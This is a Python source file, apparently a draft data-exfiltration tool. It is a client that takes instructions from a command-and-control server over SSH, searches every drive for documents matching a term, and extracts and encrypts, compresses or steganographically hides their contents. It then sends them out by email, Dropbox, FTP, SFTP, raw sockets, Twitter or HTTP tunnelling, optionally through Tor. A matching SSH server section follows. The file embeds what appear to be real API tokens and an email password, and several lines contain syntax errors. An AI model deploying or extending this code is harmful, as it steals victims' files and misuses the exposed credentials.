from __future__ import print_function
import os,re,tweepy,PyPDF2, chilkat sys,glob,webbrowser,smtplib,dropbox,ftplib,xlrd, socks, zlib, shutil,win32com.client as win32,socket,threading
from win32 import win32api
from send2trash import send2trash
from os.path import join, dirname, abspath
import mimetypes, docx, wave, binascii, struct
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from xlrd import sheet
from flask import Flask, request, render_template, send_from_directory
from xlrd.sheet import ctype_text as ctext
sys.path.extend(('C:\\Python27\\lib\\site-packages\\win32', 'C:\\Python27\\lib\\site-packages\\win32\\lib', 'C:\\Python27\\lib\\site-packages\\Pythonwin'))
'''dirName: The next directory it found.
subdirList: A list of sub-directories in the current directory.
fileList: A list of files in the current directory.
string = GetWindowsDirectory() ==== Returns the path of the Windows directory.
            while ttk<=s.count(" "):
            from send2trash import send2trash
            send2trash(path+"n"+(s.split(None, 1)[ttk]))
            ttk+=1
       
'''
#------------------------------------Rough Draft Notes----------------------------------------------------------#
'''

This file contains the code that worked individually. Other pieces of code for exfil/data transformation have
not been included if issues were present(ex:In the steganography function). At the moment these are a bunch of functions that still need to be properly assembled
into a single program. Server-side code is all the way down
'''
#------------------------------------------------------------------------------------------------------------------#
#Some Exfiltration techniques will require a functioning server that will be set up in the final package with the vms
global numBytes, numExfilFiles, numFiles, dT, eD, flg, searchMethod, searchterm, key
dT=1
eD=1
gpath=""
numFiles=1
key=""
numExfilFiles=1
numBytes=0
flg=0
CnCip= "127.0.0.1" #Should be hardcoded? Or so I think
fileFil = open("1combinedExfil.txt", "w")
import socket,base64,paramiko,threading,sys
def basicInfoConn(ip): #Initial communication with the C&C
    global numBytes, numExfilFiles, numFiles, dT, eD, flg, searchMethod, searchterm, key
    Thekey = paramiko.RSAKey.generate(1024)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username='Exfil', password='Exfil')
    tunnel = client.get_transport().open_session()
    tunnel.send("nameOrContent".encode("utf-8"))
    searchMethod=tunnel.recv(1024).decode("utf-8")
    tunnel.send('dt')
    dT= (tunnel.recv(1024)).decode("utf-8")
    if dT==1:
        key=tunnel.recv(1024).decode("utf-8")
    tunnel.send('et')
    eT= (tunnel.recv(1024)).decode("utf-8")
    searchterm=(tunnel.recv(1024).decode("utf-8"))
    client.close
basicInfoConn(CnCip)
def excelConverter(path, tname):
    excelFileInf="temp"
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    breakit=""
    for root, dirs, files in os.walk(path):
        if breakit=="true":
            break
        for name in files:
            if name == tname:
                print (os.path.abspath(os.path.join(root, name)))
                excelFileInf= os.path.abspath(os.path.join(root, name))
                breakit="true"
                break
    fileFil = open(str(numFiles)+"combinedExfil.txt", "a")
    SheetList = xlrd.open_workbook(excelFileInf)
    fnames = SheetList.sheet_names()
    fileFil.write("[Excel-Spreadsheet]")
    SpreadSheet = SheetList.sheet_by_index(0)
    fileFil.write('Sheet name:'+str(SpreadSheet.name))
    row = SpreadSheet.row(0)  #startshere
    for idx, spreadsheetCells in enumerate(row):
        ContentType = ctext.get(spreadsheetCells.ctype, 'Null')
        writtenText=str(spreadsheetCells.value)
        if numBytes+sys.getsizeof(writtenText)<45000:
            fileFil.write(("("+str(idx)+")"+" "+str(ContentType)+writtenText))
            numBytes+=sys.getsizeof(writtenText)
        else:
            numFiles+=1
            fileFil=open(+str(numFiles)+"combinedExfil.txt", "a")
            fileFil.write(("("+str(idx)+")"+" "+str(ContentType)+writtenText))
            numBytes=sys.getsizeof(writtenText)
    num_cols = SpreadSheet.ncols   # Number of columns
    for row_idx in range(0, SpreadSheet.nrows):     
        for col_idx in range(0, num_cols):  
            spreadsheetCells = SpreadSheet.cell(row_idx, col_idx)  # Get cell object by row, col
            fileFil.write('Row-Column[%s:%s] Content[%s]' % (row_idx, col_idx, spreadsheetCells))
fileFil.close()
def pdfConverter(path, tname):
    PDFFileInf="temp"
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    breakit=""
    for root, dirs, files in os.walk(path):
        if breakit=="true":
            break
        for name in files:
            if name == tname:
                print (os.path.abspath(os.path.join(root, name)))
                PDFFileInf= os.path.abspath(os.path.join(root, name))
                breakit="true"
                break
    ThePDFFile=open(PDFFileInf, "rb")
    pdfReader = PyPDF2.PdfFileReader(ThePDFFile)
    pagesRead=0
    while pagesRead<pdfReader.numPages:
        fileFil = open(str(numFiles)+"combinedExfil.txt", "a")
        PDFpage = pdfReader.getPage(pagesRead)
        PDFText=PDFpage.extractText()
        if numBytes+sys.getsizeof(PDFText)<45000:
            fileFil.write(PDFText)
            numBytes+=sys.getsizeof(PDFText)
        else:
            numFiles+=1
            fileFil=open(+str(numFiles)+"combinedExfil.txt", "a")
            fileFil.write(PDFText)
            numBytes=sys.getsizeof(PDFText)
        pagesRead+=1
def docxConverter(path, tname):
    docInf="temp"
    docInfPath="temp"
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    breakit=""
    for root, dirs, files in os.walk(path):
        if breakit=="true":
            break
        for name in files:
            if name == tname:
                print (os.path.abspath(os.path.join(root, name)))
                docInfPath= os.path.abspath(os.path.join(root, name))
                breakit="true"
                break
    docInf=docx.Document(docInfPath)
    paragraphsRead=0
    for para in docInf.paragraphs:
        fileFil = open(str(numFiles)+"combinedExfil.txt", "a")
        docText=para.text
        if numBytes+sys.getsizeof(docText)<45000:
            fileFil.write(docText)
            numBytes+=sys.getsizeof(docText)
        else:
            numFiles+=1
            fileFil=open(+str(numFiles)+"combinedExfil.txt", "a")
            fileFil.write(docText)
            numBytes=sys.getsizeof(docText)
def victimUDP():
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    host = "127.0.0.1"
    port = 6321
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.connect((host, port))
    NFI=1
    while NFI<numExfilFiles:
        file = open((gpath+"X\\"+str(NFI)+"combinedExfil"), 'r')
        for line in file:
            soc.sendto(line.encode(),(host, port))
        soc.sendto("DONE".encode(),(host, port))
        print ("File Exfiltrated")
        NFI+=1
    soc.close()
def victimTCP():
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    host = "127.0.0.1"
    port = 64321
    soc = socket.socket()
    soc.connect((host, port))
    NFI=1
    while NFI<numExfilFiles:     
        file = open((gpath+"X\\"+str(NFI)+"combinedExfil"),'r')
        for line in file:
            soc.send(line.encode())
        print ("File Exfiltrated")
        NFI+=1
    soc.close()
def extensionchange():
    wavT=open("x")
def SFTP():
    port = 2222
    hostname="demo.wftpserver.com"
    try:
        tunnel=paramiko.SSHClient()
        key = paramiko.RSAKey.generate(1024)
        tunnel = paramiko.Transport((hostname, port))
        tunnel.connect(username='demo-user', password="demo-user") #this test server seems to have an issue with the RSAKey generated, thus it is not being used
        sftp = paramiko.SFTPClient.from_transport(tunnel)
        fnum=1
        if flg!=1:
            while fnum<=numExfilFiles:
                sftp.put(gpath+"\\X"+str(fnum)+"combinedExfil.txt", "upload/X"+str(fnum)+"combinedExfil.txt")
                fnum+=1
                print(success)
        if flg==1:
            while fnum<=numExfilFiles:
                success=sftp.put(gpath+"\\X"+str(fnum)+"combinedExfil.png", "upload/X"+str(fnum)+"combinedExfil.png")
                print(success)
                fnum+=1
        tunnel.close()
    except Exception as e:
        print(e)
        tunnel.close()
def maildata():
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath, flg
    #Works but add cycling through the file and sending the contents
    content="Data Exfiltrated"
    nFI=1
    filePath=gpath
    while nFI<=numExfilFiles:
        if flg==1:
            checkf=(filePath+"\\X"+str(nFI)+"combinedExfil.png")
            print(checkf)
            ctype, encoding = mimetypes.guess_type(checkf)
        else:
            checkf=(filePath+"\\X"+str(nFI)+"combinedExfil.txt")
            print(checkf)
            ctype, encoding = mimetypes.guess_type(checkf)
        if ctype is None or encoding is not None:
            ctype = "application/octet-stream"
        maintype, subtype = ctype.split("/", 1)
        print(maintype)
        attachment=""
        if maintype == "text":
            fp = open(filePath+"\\X"+str(nFI)+"combinedExfil.txt")
            attachment = MIMEText(fp.read(), _subtype=subtype)
            fp.close()
        elif maintype == "image":
            fp = open(filePath+"\\X"+str(nFI)+"combinedExfil.png","rb")
            attachment = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
        elif maintype == "audio":
            fp = open((filePath+"\\X"+str(nFI)+"combinedExfil.wav"), "rb")
            attachment = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
        else:
            print("Invalid File Type")
        attachment.add_header("attachment",((filePath+"\\X"+str(nFI)+"combinedExfil.txt")))
        msg = MIMEMultipart()
        msg["From"] = 'datatheftsimulation@gmail.com'
        msg["To"] = 'datatheftsimulation@gmail.com'
        msg["Subject"] = "Hijacked Data"
        msg.preamble = "Data Has Been Exfiltrated"
        msg.attach(attachment)
        mail=smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login('datatheftsimulation@gmail.com','temp1234567890')
        #mail.sendmail('datatheftsimulation@gmail.com','datatheftsimulation@gmail.com', content)
        mail.sendmail('datatheftsimulation@gmail.com','datatheftsimulation@gmail.com', msg.as_string())
        mail.close()
        nFI+=1
#re.search searches the entire string
#logical drives are partioned virtual drives of the hard drive. Ex: C: drive
#The return value is a single string, with each drive letter NULL terminated.
def encrypt():
    global numExfilFiles,numFiles,gpath, key
    numF=1
    while numF<=numFiles:
        set2=""
        #fileInf=open((gpath+"\\"+str(numF)+"combinedExfil.txt"), "r").read().replace('\n', '')
        fileInf=open((gpath+"\\"+str(numF)+"combinedExfil.txt"), "r")
        numF+=1
        for line in fileInf:
            for i, c in enumerate(line):
                KY1 = ord(key[4 % len(key)])
                enmsc = ord(c)
                set2+=(chr((enmsc + KY1) % 129))
            if numBytes+sys.getsizeof(set2)>=45000:
                numExfilFiles+=1
                numBytes=0
                numBytes=sys.getsizeof(set2)
                fileFilEx=open((gpath+"\\X"+str(numExfilFiles)+"combinedExfil.txt"), "a")
                fileFilEx.write(set2)
                set2=""
            elif numBytes+sys.getsizeof(set2)<45000:
                fileFilEX=open("X"+(str(numExfilFiles)+"combinedExfil.txt"), "a")
                fileFilEX.write(set2)
                numBytes+=sys.getsizeof(set2)
                set2=""
            else:
                print("Code is Broken")
def compressionOfFile():
    global numBytes, numExfilFiles, numFiles, dT, eD,gpath
    changed=""
    fileFilEX=open((gpath+"\\X"+str(numExfilFiles)+"combinedExfil.txt"), "ab")
    fn=1
    while fn<=numFiles:
        text= open(gpath+"\\"+str(fn)+"combinedExfil.txt", 'r').read()
        if numBytes+sys.getsizeof(zlib.compress(text.encode(), 9))<45000:
            fileFilEX.write(zlib.compress(text.encode("utf-8"), 9))
            numBytes+=sys.getsizeof(zlib.compress(text.encode("utf-8"), 9))
            fn+=1
        else:
            numExfilFiles+=1
            numBytes=sys.getsizeof(zlib.compress(text.encode("utf-8"), 9))
            fileFilEx.close()
            fileFilEx=open((gpath+"\\X"+str(numExfilFiles)+"combinedExfil.txt"), "ab")
            fileFilEx.write(zlib.compress(text.encode("utf-8"), 9))
            fn+=1
def checkLine(filePath):
    for line in open(filePath):
        last=line
    return last
from stegano import lsb
def downloadImage():
    global ,gpath
    User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
    MDFolder = User.metadata('/')
    print( 'MD: ', MDFolder)
    f, MD = User.get_file_and_metadata("/diamond_PNG6695.png")
    out = open(gpath+'\diamond_PNG6695.png', 'wb')
    out.write(f.read())
    out.close()
def stego():
    print("hi")
    global numBytes, numExfilFiles, numFiles, dT, eD,flg,textAdd,gpath
    numF=1
    flg=1
    downloadImage()
    while numF<=numFiles:
        print("hey")
        textF=open((gpath+"\\"+str(numF)+"combinedExfil.txt"), "r")
        numBytestextEx=0
        textAdd=""
        last=checkLine(gpath+"\\"+str(numF)+"combinedExfil.txt")
        for line in textF:
            if numBytestextEx+sys.getsizeof(line)<20000:
                numBytestextEx+=sys.getsizeof(line)
                textAdd+=line
                if line==last:
                    secret = lsb.hide(gpath+"\\diamond_PNG6695.png" , textAdd)
                    secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
            elif numBytestextEx+sys.getsizeof(line)>=20000:
                textAdd=line
                secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
                secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
                print(lsb.reveal(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png"))
                numExfilFiles+=1
                if line==last:
                    secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
                    secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
        numF+=1
def SSHTunnel():
    global numBytes, numExfilFiles, numFiles, dT, eD, flg,gpath
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('127.0.0.1', username='Exfil', password='Exfil')
    tunnel = client.get_transport().open_session()
    tunnel.send('Ready to send')
    fnum=1
    if flg!=1:
        while fnum<numExfilFiles:
            fileEx= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
            for line in fileEx:
                tunnel.send(line)
            fnum+=1
    if flg==1:
        while fnum<numExfilFiles:
            session.cwd('upload')   # you can upload file in upload dir on the server
            file= open(gpath+"\\X"+str(fnum)+"combinedExfil.png",'rb')  # file to be uploaded
            tunnel.send(file)
            fnum+=1
    tunnel.send('Success')
    print (tunnel.recv(1024))
    client.close
def dropBox():
    User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
    print ('linked account: ', User.account_info())
    fnum=1
    global numBytes, numExfilFiles, numFiles, dT, eD, flg,gpath
    if flg!=1:
        while fnum<=numExfilFiles:
            f = open(gpath+"\\X"+str(fnum)+"combinedExfil.txt" , 'r')
            DropBoxRes = User.put_file("X"+str(fnum)+"combinedExfil.txt" , f)
            print ('uploaded: ', DropBoxRes)
            fnum+=1
    if flg==1:
        while fnum<=numExfilFiles:
            print(gpath)
            f = (open(gpath+"\\X"+str(fnum)+"combinedExfil.png", 'rb'))
            DropBoxRes = User.put_file("X"+str(fnum)+"combinedExfil.png" , f)
            print ('uploaded: ', DropBoxRes)
            fnum+=1
def tor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    #It will directly connect to our ip provided rather than send traffic through tor, thus socks need to be used first
    socket.socket=socks.socksocket #Overrides default socket object and sets it equal to the socks object
def FTPTransferOnline(): #This also assumes it will go out in txt file format, will be changed in the future
   # SAD=input("Enter the server address")
   #Uname=input("FTP: User Name")
   #passW=input("FTP: Password")
   #session = ftplib.FTP(SAD,Uname,passW)
    global numBytes, numExfilFiles, numFiles, dT, eD,flg,gpath
    print(gpath)
    session = ftplib.FTP('demo.wftpserver.com','demo-user', 'demo-user')
    session.login('demo-user', 'demo-user') 
    #login("ftpuser","pwd")
    session.retrlines('LIST')     # list directory contents
    fnum=1
    if flg!=1:
        while fnum<=numExfilFiles:
            session.cwd('upload')   # you can upload file in upload dir on the server
            file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
            session.storbinary(gpath+"\\X"+str(fnum)+"combinedExfil.txt",file)
            fnum+=1
    if flg==1:
        while fnum<=numExfilFiles:
            session.cwd('upload')   # you can upload file in upload dir on the server
            file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
            session.storbinary("STOR "+gpath+"\\X"+str(fnum)+"combinedExfil.png",file)
            fnum+=1
    print(session.dir('*.txt'))
    session.quit()
def TwitterExfil():
    acctAuth = tweepy.OAuthHandler('dUofYHNaz6x87PWl99XuX0FKe','8HxaJFQC2xJK7JtUdcRQWDzcgDwlQSkuyrHPqVvEA8Gskp3X3g')
    acctAuth.set_access_token('755773090412593152-R8U0GsqideOYocrREbm24F4eVsZ6D0c','VFnXKpUp4TQXgM3Bep1ZoOT0FQWWZ40bKPgmyrYKt21AQ')
    api = tweepy.API(acctAuth)
    fnum=1
    global numBytes, numExfilFiles, numFiles, dT, eD, flg,gpath
    if flg!=1:
        while fnum<=numExfilFiles:
            for line in open( (gpath+"\\X"+str(fnum)+"combinedExfil.txt"), 'r' ):
                tweet = line
                status = api.update_status(status=tweet)
            fnum+=1
    if flg==1:
        while fnum<=numExfilFiles:
            filename=gpath+"\\X"+str(fnum)+"combinedExfil.png"
            api.update_with_media(filename, status=fnum)
            fnum+=1
def HttpTunnel(): 
    #FTP through HTTP proxy tunneling
    ftp = chilkat.CkFtp2()
    ftp.UnlockComponent("Any String Works")
    ftp.put_Hostname("demo.wftpserver.com")
    ftp.put_Username("demo-user")
    ftp.put_Password("demo-user")
    ftp.put_HttpProxyHostname("192.168.1.127") #Users input will need to be added
    ftp.put_HttpProxyPort(19893) #Or enter your own
    ftp.put_HttpProxyUsername("myProxyUsername")
    ftp.put_HttpProxyPassword("myProxyPassword")

    ftp.put_Passive(True)
    ftp.Connect()
    ftp.ChangeRemoteDir("upload")
    localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.txt")
    remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
    fnum=1
    if flg!=1:
        while fnum<=numExfilFiles:
            localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.txt")
            remoteFilename = "X"+str(fnum)+"combinedExfil.txt")
            ftp.PutFile(localFilename,remoteFilename)
            fnum+=1
    if flg==1:
        while fnum<=numExfilFiles:
            localFilename = (gpath+"\\X"+str(fnum)+"combinedExfil.png")
            remoteFilename = "X"+str(fnum)+"combinedExfil.png")
            ftp.PutFile(localFilename,remoteFilename)
            fnum+=1
    ftp.PutFile(localFilename,remoteFilename)
    ftp.Disconnect()
    print("Files(s) Uploaded!")
def FTPTransfer():
    #This also assumes it will go out in txt file format, will be changed in the future
    global numBytes, numExfilFiles, numFiles, dT, eD,gpath
    print(gpath)
    fip=input("FTP Server IP:")
    uname=input("username:")
    pword=input("Password:")
    session = ftplib.FTP(fip,uname, pword)
    session.login(uname, pword) 
    #login("ftpuser","pwd")
    session.retrlines('LIST')     # list directory contents
    fnum=1
    if flg!=1:
        while fnum<=numExfilFiles:
            session.cwd('upload')   # you can upload file in upload dir on the server
            file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
            session.storbinary(gpath+"\\X"+str(fnum)+"combinedExfil.txt",file)
            fnum+=1
    if flg==1:
        while fnum<=numExfilFiles:
            session.cwd('upload')   # you can upload file in upload dir on the server
            file= open(gpath+"\\X"+str(fnum)+"combinedExfil.txt",'rb')  # file to be uploaded
            session.storbinary("STOR "+gpath+"\\X"+str(fnum)+"combinedExfil.png",file)
            fnum+=1
    print(session.dir('*.txt'))
    file.close()                                    
    session.quit()
def keepAsIs():
    global numExfilFiles, numFiles, dT, eD,gpath
    currentFile=0
    while currentFile<=numFiles:
        shutil.copy2(source, gpath+"\\X"+str(currentFile)+"combinedExfil.txt")
    numExfilFiles=numFiles

def dataTransformationMethod(path, s, name, spaces):
    global numBytes, numExfilFiles, numFiles, dT, eD,gpath
    if dT==1:
        encrypt()
    if dT==2:
        compressionOfFile()
    if dT==3:
        stego()
    if dT==5:
        keepAsIs()
    if dT==4:
        extensionchange()
def exfiltrationMethod(s,fname,spaces):
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath
    path=gpath

    if eD==1:
        dataTransformationMethod(path,s,fname,spaces)
        maildata()
    if eD==2:
        dataTransformationMethod(path,s,fname,spaces)
        dropBox()
    if eD==3:
        dataTransformationMethod(path,s,fname,spaces)
        victimTCP()
    if eD==4:
        dataTransformationMethod(path,s,fname,spaces)
        FTPTransferOnline()#Client to ftpserver to Serverside
    if eD==5:
        dataTransformationMethod(path,s,fname,spaces)
        FTPTransfer()#client to serverside direct
    if eD==6:
        dataTransformationMethod(path,s,fname,spaces)
        SFTP()
    if eD==7:
        dataTransformationMethod(path,s,fname,spaces)
        victimUDP()
    if eD==8:
        dataTransformationMethod(path,s,fname,spaces)
        TwitterExfil()
    if eD==9:
        dataTransformationMethod(path,s,fname,spaces)
        SSHTunnel()
    if eD==10:
        dataTransformationMethod(path,s,fname,spaces)
        HttpTunnel()
    if eD==11:
        DnsQueries()
def putTogether(s, numFilesC, pathOr):
    counterFile=0
    global numBytes, numExfilFiles, numFiles, dT, eD, gpath
    breakit=""

    while counterFile<=numFilesC:
        if ((s.split(None)[counterFile]).lower().endswith(".txt")):
            fileFil=open(str(numFiles)+"combinedExfil.txt", "a")
            for line in open( ("nx1x"+s.split(None)[counterFile]), 'r' ):
                if numBytes+sys.getsizeof(line)<45000:
                    fileFil.write( line )
                else:
                    numFiles+=1
                    fileFil.close()
                    fileFil=open(+str(numFiles)+"combinedExfil.txt", "a")
                    fileFil.write(line)
            for root, dirs, files in os.walk(pathOr):
                if breakit=="true":
                    break
                for name in files:
                    if name == "nx1x"+s.split(None)[counterFile]:
                        print ("Rewritten Combiner works")
                        GarbagePath= os.path.abspath(os.path.join(root, name))
                        gpath= os.path.abspath(os.path.join(root))
                        breakit="true"
                        break
        #send2trash(GarbagePath+"\\"+s.split(None)[counterFile])
        counterFile+=1
    exfiltrationMethod(s,"1combinedExfil", numFilesC)
def nameSearch():
    global numBytes, numExfilFiles, numFiles, dT, eD,gpath,searchterm
    drives =win32api.GetLogicalDriveStrings()
    print(drives)
    drives = drives.split('\000')
    print(drives[0])
    kc=0  
    while kc<len(drives)-1:
        pathOr=(str(drives[kc]))[:-1]
        kc+=1
        try:
            print(len(drives))
            print(pathOr)
            os.chdir(pathOr)
        except PermissionError:
            print(pathOr+" cannot be accessed") 
            
        search = '*' + searchterm + '*' 
        text_files = glob.glob(search) #captures the file name with extension as a list
        s= ""
        s = " ".join(text_files) #to convert list to string
        word=s.count(" ")
        k=0
        source=""
        path3=""
        path2=""
        while (k<=word and not s==""):
            if s.split(None)[k].lower().endswith('.docx'): 
                docxConverter(pathOr, s.split(None)[k])
            if s.split(None)[k].lower().endswith('.xlsx'):
                excelConverter(pathOr, s.split(None)[k])
            if s.split(None)[k].lower().endswith('.pdf'):
                pdfConverter(pathOr, s.split(None)[k])
            if s.split(None)[k].lower().endswith('.txt'):
                breakit=""
                for root, dirs, files in os.walk(pathOr):
                    if breakit=="true":
                        break
                    for name in files:
                        if name == s.split(None)[k]:
                            print (os.path.abspath(os.path.join(root, name)))
                            path3= os.path.abspath(os.path.join(root, name))
                            source= os.path.abspath(os.path.join(root, name))
                            path2=os.path.abspath(os.path.join(root))
                            breakit="true"
                            break
                source= path3
                destination =(path2 + '\\nx1x' + (s.split(None)[k]))
                print(destination)
                if not s.split(None)[k].startswith("nx1x"):
                    shutil.copy2(source, destination) #creates a copy of the source file at the destination and file name specified
                names2=""
            if (k==word and word>0):
                putTogether(s, word, pathOr) #Add nx1x to the puttogether search later to modify correct files
            k+=1
def contentSearch(): #Content search needs slight fixing, it will be fixed
    global numBytes, numExfilFiles, numFiles, dT, eD,gpath,searchterm
    drives = win32api.GetLogicalDriveStrings()
    print(drives)
    drives = drives.split('\000')
    print(drives[0])
    kc=0
    s=""
    textmatches=1
    while kc<len(drives)-1:
        pathOr=(str(drives[kc]))[:-1]
        for root, dirs, files in os.walk(pathOr):
            for name in files:
                textmatches=1
                if name.lower().endswith('.txt'):
                    for line in open(os.path.abspath(os.path.join(root, name)), "r"):
                        if searchterm.lower() in line.lower():
                            if s!="":
                                s+= " "+(name)
                                break
                            else:
                                s+=""+(name)
                                break
                if name.lower().endswith('.xlsx'):
                    SheetList = xlrd.open_workbook(os.path.abspath(os.path.join(root, name)))
                    fnames = SheetList.sheet_names()
                    SpreadSheet = SheetList.sheet_by_index(0)
                    if searchterm in str(SpreadSheet.name):
                        textmatches=2
                        break
                    row = SpreadSheet.row(0)  #startshere
                    for idx, spreadsheetCells in enumerate(row):
                        if searchterm in str(spreadsheetCells.value):
                            textmatches=2
                            break
                    num_cols = SpreadSheet.ncols   # Number of columns
                    for row_idx in range(0, SpreadSheet.nrows):     
                        for col_idx in range(0, num_cols):  
                            spreadsheetCells = SpreadSheet.cell(row_idx, col_idx)  # Get cell object by row, col
                            if searchterm.lower() in ('Row-Column[%s:%s] Content[%s]' % (row_idx, col_idx, spreadsheetCells)).lower():
                                textmatches=2
                                break
                    if textmatches==2:
                        if s!="":
                            s+= " "+name
                        else:
                            s+=""+name
                        textmatches=1
                if name.lower().endswith(".docx"):
                    docInfPath= os.path.abspath(os.path.join(root, name))
                    docInf=docx.Document(docInfPath)
                    for para in docInf.paragraphs:
                        docText=para.text
                        if searchterm.lower() in docText.lower():
                            textmatches=2
                            break
                    if textmatches==2:
                        if s!="":
                            s+= " "+name
                        else:
                            s+=""+name

                if name.lower().endswith(".pdf"):
                    print(name)
                    PDFFileInf= os.path.abspath(os.path.join(root, name))
                    ThePDFFile=open(PDFFileInf, "rb")
                    pdfReader = PyPDF2.PdfFileReader(ThePDFFile)
                    pagesRead=0
                    while pagesRead<pdfReader.numPages:
                        PDFpage = pdfReader.getPage(pagesRead)
                        PDFText=PDFpage.extractText()
                        if searchterm.lower() in PDFText.lower():
                            if s!="":
                                s+= " "+name
                            else:
                                s+=""+name
                            break
                        pagesRead+=1
            word=s.count(" ")
            k=0
            source=""
            path3=""
            path2=""
            while (k<=word and not s==""):
                if s.split(None)[k].lower().endswith('.docx'): 
                    docxConverter(pathOr, s.split(None)[k])
                if s.split(None)[k].lower().endswith('.xlsx'):
                    excelConverter(pathOr, s.split(None)[k])
                if s.split(None)[k].lower().endswith('.pdf'):
                    pdfConverter(pathOr, s.split(None)[k])
                if s.split(None)[k].lower().endswith('.txt'):
                    breakit=""
                    for root, dirs, files in os.walk(pathOr):
                        if breakit=="true":
                            break
                        for name in files:
                            if name == s.split(None)[k]:
                                print (os.path.abspath(os.path.join(root, name)))
                                path3= os.path.abspath(os.path.join(root, name))
                                source= os.path.abspath(os.path.join(root, name))
                                path2=os.path.abspath(os.path.join(root))
                                breakit="true"
                                break
                    source= path3
                    destination =(path2 + '\\nx1x' + (s.split(None)[k]))
                    print(destination)
                    if not s.split(None)[k].startswith("nx1x"):
                        shutil.copy2(source, destination) #creates a copy of the source file at the destination and file name specified
                    names2=""
                if (k==word and word>0):
                    putTogether(s, word, pathOr) #Add nx1x to the puttogether search later to modify correct files
                k+=1  
        kc+=1
#More Exfil methods to be added
#Serverside code below
#--------------------------------------------------------------------------------------------------------------------------------------------
#------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------
#------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------------SERVER SIDE(Under Work)------
#--------------------------------------------------------------------------------------------------------------------------------------------
'''
from __future__ import print_function
import os,re,sys,glob,paramiko,webbrowser,smtplib,dropbox,ftplib,xlrd, socks, zlib, shutil,win32com.client,socket,threading
from win32 import win32api
from send2trash import send2trash
from os.path import join, dirname, abspath
import mimetypes
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from xlrd import sheet
from flask import Flask, request, render_template, send_from_directory
from xlrd.sheet import ctype_text as ctext
sys.path.extend(('C:\\Python27\\lib\\site-packages\\win32', 'C:\\Python27\\lib\\site-packages\\win32\\lib', 'C:\\Python27\\lib\\site-packages\\Pythonwin'))
global key, eD, dT
key=""
eD=0
dT=0
class Interface (paramiko.ServerInterface): #Server Interface is being defined
    def check_channel_request(self, kind, chanid):
        self.event = threading.Event()
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'Exfil') and (password == 'Exfil'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
Def Start():
    global key, eD, dT
    Thekey=paramiko.RSAKey.generate(1024)
    tcpSocketObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpSocketObj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
    tcpSocketObj.bind(('127.0.0.1', 22))
    tcpSocketObj.listen(100)
    print ('Waiting For Connection')
    client, addr = tcpSocketObj.accept()
    print ('Connection made with '+str(client)+" with the ip"+ str(addr))
    cliD = paramiko.Transport(client)
    cliD.load_server_moduli()
    cliD.add_server_key(Thekey)
    server = Interface()
    cliD.start_server(server=server)
    tunnel = cliD.accept(20)
    print ('Connected with client side')
    if tunnel.recv(1024).decode("utf-8")=="nameOrContent":
        Emethod=input("Enter 1 to search for files by name or 2 to search for files through their content")
        tunnel.send(Emethod.encode("utf-8"))
    if tunnel.recv(1024).decode("utf-8")=="dt":
        print("1-Encryption, 2-Compression, 3-Steganography, 3-Extension Change, 4-Keep As Is")
        dT=input("Enter a data transformation method of your liking (1-4)")
        tunnel.send(dT.encode("utf-8"))
        if dT==1:
            key=input("Encryption Key=")
            tunnel.send(key.encode("utf-8"))
    if tunnel.recv(1024).decode("utf-8")=="et":
        print("1-Email, 2-dropBox, 3-TCP, 4-FTP Online(Using an external server to upload to and then download from), 5-FTP Transfer")
        print("6-SFTP, 7-UDP, 8-Twitter, 9-SSH Tunneling, 10-HTTP Tunneling, 11-DNS tunneling(A DNS server needs to be set up along with dns logging. Modifications to how sub-domains are dealt with may be required)")
        eT=input("Enter a data exfilteration method of your liking (1-11)")
        tunnel.send(eT)
